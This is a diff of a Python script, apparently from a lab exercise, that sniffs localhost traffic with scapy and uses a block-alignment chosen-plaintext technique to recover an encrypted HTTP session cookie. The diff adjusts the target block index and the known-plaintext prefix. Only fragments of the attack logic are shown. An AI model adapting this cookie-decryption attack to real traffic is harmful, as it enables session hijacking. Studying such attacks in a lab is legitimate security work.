@@ -1,19 +1,7 @@
 from socket import *
 from scapy.all import sniff, Raw, TCP
 import threading
-
-BLOCK_SIZE = 16
-STARTING_COOKIE_BLOCK = 17
-COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK
-host = "127.0.0.3"
-file_path = "aaaaaaaaaaabfffffffffffffff"
-stop_sniffing = False
-captured_packet = None
-
-condition = threading.Condition()
-condition_met = False
-my_last_captured = None #fix for the problem of sniffing every packet twice
-
+#This is how the request looks like:
 '''
 POST /aaaaaaaaaa
 abffffffffffffff
@@ -36,6 +24,23 @@ Cookie: session_
 id=Secret_Val\r\n\r
 \n
 '''
+#IMPORTANT NOTE: Although using docker, the 'User-Agent' header might change, depends on the hosting machine.
+#For example, while using linux: "Mozilla/4.0 (Linux 5.15.0-125-generic) Java/1.7.0\r\n"
+#That will change the blocks boundaries- THUS YOU SHOULD ADJUST "STARTING_COOKIE_BLOCK" and
+#"i_know" (in the main function). In comment- the correct values for the above request.
+#The defualt values(5,': Mozilla/4.0 (') will make the attacker decrypt starting at block 5 till the end
+BLOCK_SIZE = 16
+STARTING_COOKIE_BLOCK = 5 #17
+COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK
+host = "127.0.0.3"
+file_path = "aaaaaaaaaaabfffffffffffffff"
+stop_sniffing = False
+captured_packet = None
+
+condition = threading.Condition()
+condition_met = False
+my_last_captured = None #fix for the problem of sniffing every packet twice
+
 
 # Function to sniff packets
 def sniff_packets():
@@ -87,7 +92,7 @@ def main(sock):
     global file_path , COOKIE_BLOCK_NUM, STARTING_COOKIE_BLOCK, BLOCK_SIZE
     curr_file_path = file_path
     iv = None
-    i_know = b'Cookie: session'
+    i_know = b': Mozilla/4.0 (' #b'Cookie: session'
     attacker_cookie = b''
     cipher = None
 
